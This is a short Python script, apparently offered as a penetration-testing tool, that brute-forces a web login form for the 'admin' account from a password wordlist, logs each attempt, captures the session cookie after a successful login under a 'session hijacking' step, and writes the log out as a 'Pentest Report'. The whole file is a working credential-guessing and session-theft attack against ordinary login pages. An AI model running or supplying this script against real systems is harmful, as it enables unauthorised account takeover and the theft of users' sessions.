import requests
import logging

# Configure logging
logging.basicConfig(filename='pentest.log', level=logging.INFO)

# Configuration
target_url = 'http://example.com/login'
username = 'admin'
wordlist = 'passwords.txt'  # Path to your password list

def login_attempt(username, password):
    payload = {
        'username': username,
        'password': password
    }
    response = requests.post(target_url, data=payload)
    return response

def is_login_successful(response):
    # Define a success condition based on the response content
    if 'Welcome' in response.text:  # Modify based on actual success message
        return True
    return False

def password_cracking(username, wordlist):
    with open(wordlist, 'r') as file:
        for line in file:
            password = line.strip()
            response = login_attempt(username, password)
            if is_login_successful(response):
                logging.info(f'Success! Username: {username} | Password: {password}')
                print(f'Success! Username: {username} | Password: {password}')
                session_hijacking(response)
                break
            else:
                logging.info(f'Failed attempt. Username: {username} | Password: {password}')

def session_hijacking(response):
    session_cookie = response.cookies.get_dict()
    logging.info(f'Session Hijacked: {session_cookie}')
    print(f'Session Hijacked: {session_cookie}')

def generate_report():
    with open('pentest.log', 'r') as log_file:
        report_content = log_file.read()
    
    with open('report.txt', 'w') as report_file:
        report_file.write('Pentest Report\n')
        report_file.write('==============\n\n')
        report_file.write(report_content)

def main():
    # Start password cracking
    password_cracking(username, wordlist)
    # Generate the report
    generate_report()

if __name__ == '__main__':
    main()
